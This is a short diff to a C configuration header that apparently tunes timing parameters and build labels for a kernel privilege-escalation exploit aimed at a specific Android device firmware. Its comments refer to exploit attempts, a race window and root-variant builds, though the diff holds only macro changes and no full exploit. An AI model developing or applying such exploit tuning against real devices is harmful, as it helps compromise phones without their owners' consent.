@@ -9,19 +9,20 @@
 #include "../e3q-S928USQS6DZF2/target.h"
 
 /*
- * The app-context DZG1 run reached the physical P0 oracle at 25 ms but missed
- * the pselect write window.  Sweep nearby device-local timings while keeping
- * the outer exploit attempt count unchanged.
+ * DZG1 reaches the P0 scheduler trigger consistently while pselect still
+ * reports a timeout.  Accept only the successful scheduler call provisionally
+ * and let the exact pipe-page marker verify whether a write occurred.
  */
 #if defined(APP_PAYLOAD) && APP_PAYLOAD
 #undef SLIDE_PHYSICAL_SLOT_DELAYS_USEC
-#define SLIDE_PHYSICAL_SLOT_DELAYS_USEC 20000, 30000, 50000
+#define SLIDE_PHYSICAL_SLOT_DELAYS_USEC 25000
+#define APP_ACCEPT_SCHED_TRIGGER 1
 #endif
 
 #undef BUILD_VARIANT_LABEL
 #if defined(APP_PAYLOAD) && APP_PAYLOAD
 #define BUILD_VARIANT_LABEL \
-  "e3q-S928USQS6DZG1-app-physical-p0-oracle-timing3"
+  "e3q-S928USQS6DZG1-app-physical-p0-oracle-sched-verify"
 #else
 #define BUILD_VARIANT_LABEL "e3q-S928USQS6DZG1-root-umh"
 #endif
